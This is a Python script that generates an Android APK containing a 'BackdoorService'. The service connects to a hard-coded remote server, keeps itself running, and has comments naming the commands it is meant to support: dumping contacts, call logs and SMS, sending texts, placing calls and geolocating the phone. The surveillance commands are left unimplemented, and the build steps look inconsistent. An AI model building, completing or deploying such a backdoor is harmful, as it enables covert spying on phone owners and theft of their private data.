import os
import sys
import subprocess
import argparse

def compile_java(java_file):
    subprocess.run(['javac', java_file])

def create_apk(output):
    # Assuming you have already set up the APK structure and AndroidManifest.xml
    subprocess.run(['jar', 'cf', 'classes.jar', '-C', 'bin', '.'])
    subprocess.run(['d8', '--output=out', 'classes.jar'])
    subprocess.run(['apktool', 'b', 'out', '-o', output])

def generate_payload(output):
    java_code = """
    import android.app.Service;
    import android.content.Intent;
    import android.os.IBinder;
    import android.database.Cursor;
    import android.provider.ContactsContract;
    import android.provider.CallLog;
    import android.telephony.SmsManager;
    import android.location.Location;
    import android.location.LocationManager;
    import java.io.IOException;
    import java.io.OutputStream;
    import java.io.PrintWriter;
    import java.net.Socket;

    public class BackdoorService extends Service {
        private static final String SERVER_IP = "10.0.1.33";
        private static final int SERVER_PORT = 9999;

        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            new Thread(() -> {
                try (Socket socket = new Socket(SERVER_IP, SERVER_PORT);
                     OutputStream outputStream = socket.getOutputStream();
                     PrintWriter writer = new PrintWriter(outputStream, true)) {

                    writer.println("Connected to backdoor service");

                    // Implement the commands here
                    // dump_contacts, dump_calllog, dump_sms, send_sms, call, geolocate

                } catch (IOException e) {
                    e.printStackTrace();
                }
            }).start();
            return START_STICKY;
        }
    }
    """
    with open("BackdoorService.java", "w") as f:
        f.write(java_code)
    
    compile_java("BackdoorService.java")
    create_apk(output)

def main():
    parser = argparse.ArgumentParser(description="Generate an APK payload with specified functionalities.")
    parser.add_argument('-o', '--output', required=True, help='Output APK file name')
    args = parser.parse_args()
    
    generate_payload(args.output)

if __name__ == "__main__":
    main()
